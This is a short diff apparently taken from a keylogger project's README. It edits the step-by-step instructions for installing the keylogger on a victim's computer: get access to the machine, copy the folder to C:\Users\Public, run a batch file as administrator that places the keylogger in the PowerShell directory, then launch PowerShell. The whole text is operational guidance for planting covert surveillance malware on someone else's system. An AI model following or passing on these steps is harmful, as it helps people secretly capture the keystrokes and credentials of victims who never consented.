@@ -17,7 +17,7 @@ They should include:
 What you need to do is:
 
 1. Get access to the victim's computer.
-2. Copy the folder to the Deskop.
+2. Copy the folder to "C:\Users\Public" <-- You can replace this with whatever you like, just make sure you change it in copy.bat as well.
 3. Run the batch file AS AN ADMINISTRATOR which will copy the keylogger to the powershell directory on the drive.
 4. Press ( Windowskey + r)
 5. type: powershell  and then press enter.
